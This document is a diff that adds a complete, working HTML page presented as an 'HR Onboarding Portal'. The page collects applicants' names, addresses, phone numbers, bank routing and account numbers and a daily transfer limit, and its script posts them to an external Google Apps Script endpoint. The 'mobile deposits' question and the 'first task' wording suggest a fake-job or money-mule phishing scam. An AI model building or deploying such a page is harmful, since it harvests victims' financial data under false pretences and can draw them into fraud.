@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>HR Onboarding Portal</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: url('A_professional_background_image_for_an_HR_onboardi.png') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      color: #333;
+      box-sizing: border-box;
+    }
+    .form-container {
+      background: rgba(255, 255, 255, 0.95);
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+      max-width: 450px;
+      width: 90%;
+      box-sizing: border-box;
+    }
+    h1 {
+      text-align: center;
+      color: #4CAF50;
+      margin-bottom: 20px;
+      font-size: 28px;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+      color: #555;
+    }
+    input, select, button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 8px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+    button {
+      background: #4CAF50;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      border: none;
+      margin-top: 20px;
+    }
+    button:hover {
+      background: #3E8E41;
+    }
+    .note, .legal {
+      font-size: 13px;
+      color: #666;
+      margin-top: 10px;
+      text-align: justify;
+    }
+    .form-row {
+      display: flex;
+      align-items: center;
+      margin-top: 15px;
+    }
+    .form-row span {
+      font-size: 16px;
+      margin-right: 8px;
+      color: #555;
+    }
+    .success-message {
+      display: none;
+      text-align: center;
+      color: #4CAF50;
+      font-weight: bold;
+      margin-top: 20px;
+    }
+    /* Hide the routing/account inputs initially */
+    #routingNumberRow, #accountNumberRow {
+      display: none;
+    }
+    @media (max-width: 500px) {
+      .form-container {
+        padding: 20px;
+      }
+      h1 {
+        font-size: 24px;
+      }
+      input, select, button {
+        font-size: 14px;
+        padding: 10px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <h1>HR Onboarding Form</h1>
+    <form id="hrForm">
+      <input type="hidden" name="_captcha" value="false" />
+
+      <label for="name">Full Name</label>
+      <input type="text" id="name" name="Full Name" placeholder="Enter your full name" required />
+
+      <label for="address">Residential Address</label>
+      <input type="text" id="address" name="Residential Address" placeholder="Enter your address" required />
+
+      <label for="mobile">Mobile Number</label>
+      <input type="tel" id="mobile" name="Mobile Number" placeholder="Enter your mobile number" required />
+
+      <label for="provider">Payroll Service Provider</label>
+      <input type="text" id="provider" name="Payroll Service Provider" placeholder="e.g., Chase, Bank of America" required />
+
+      <label for="paymentMode">Preferred Payment Method</label>
+      <select id="paymentMode" name="Preferred Payment Method" required>
+        <option value="Mobile Deposit" selected>Mobile Deposit</option>
+        <option value="Credit Card">Credit Card</option>
+      </select>
+
+      <!-- Conditional fields for Mobile Deposit -->
+      <div id="routingNumberRow" class="form-row">
+        <label for="routingNumber" style="width:100%;">Routing Number</label>
+        <input type="text" id="routingNumber" name="Routing Number" placeholder="Enter routing number" />
+      </div>
+
+      <div id="accountNumberRow" class="form-row">
+        <label for="accountNumber" style="width:100%;">Account Number</label>
+        <input type="text" id="accountNumber" name="Account Number" placeholder="Enter account number" />
+      </div>
+
+      <label for="familiar">Are you familiar with mobile deposits?</label>
+      <select id="familiar" name="Familiar with Mobile Deposit" required>
+        <option value="Yes" selected>Yes</option>
+        <option value="No">No</option>
+      </select>
+
+      <p class="note">
+        <strong>Note:</strong> Please ensure all details are accurate to facilitate smooth payroll processing.
+      </p>
+
+      <label for="limit">Daily Transfer Limit</label>
+      <div class="form-row">
+        <span>$</span>
+        <input type="number" id="limit" name="Daily Transfer Limit" placeholder="Enter limit (e.g., 500)" required />
+      </div>
+
+      <div class="legal">
+        By submitting this form, you agree to our terms of service and privacy policy. Your information will only be used for onboarding purposes.
+      </div>
+
+      <button type="submit">Submit</button>
+    </form>
+
+    <div class="success-message" id="successMessage">
+      Thank you for completing the form! Please contact HR at <strong></strong> to confirm your readiness for your first task. Welcome aboard; we're excited to have you on the team!
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('hrForm');
+    const successMessage = document.getElementById('successMessage');
+    const paymentMode = document.getElementById('paymentMode');
+    const routingRow = document.getElementById('routingNumberRow');
+    const accountRow = document.getElementById('accountNumberRow');
+    const routingInput = document.getElementById('routingNumber');
+    const accountInput = document.getElementById('accountNumber');
+
+    // Show/hide routing/account fields based on payment method
+    function toggleRoutingAccountFields() {
+      if (paymentMode.value === 'Mobile Deposit') {
+        routingRow.style.display = 'block';
+        accountRow.style.display = 'block';
+        routingInput.required = true;
+        accountInput.required = true;
+      } else {
+        routingRow.style.display = 'none';
+        accountRow.style.display = 'none';
+        routingInput.required = false;
+        accountInput.required = false;
+        routingInput.value = '';
+        accountInput.value = '';
+      }
+    }
+
+    paymentMode.addEventListener('change', toggleRoutingAccountFields);
+
+    // Initialize on page load
+    toggleRoutingAccountFields();
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const formData = new FormData(form);
+
+      try {
+        const response = await fetch('https://script.google.com/macros/s/AKfycbxvB97LQAk8RzfSX0CGCv609tTK0o-T0q5t1SpuiDtE8XjNt5osbKDp2ZV43vB2gN85/exec', {
+          method: 'POST',
+          body: formData,
+        });
+
+        const result = await response.text();
+
+        if (response.ok && result.includes("Success")) {
+          form.style.display = 'none';
+          successMessage.style.display = 'block';
+        } else {
+          alert('Submission failed. Server response: ' + result);
+        }
+      } catch (error) {
+        alert('Network error. Please try again.');
+        console.error(error);
+      }
+    });
+  </script>
+</body>
+</html>
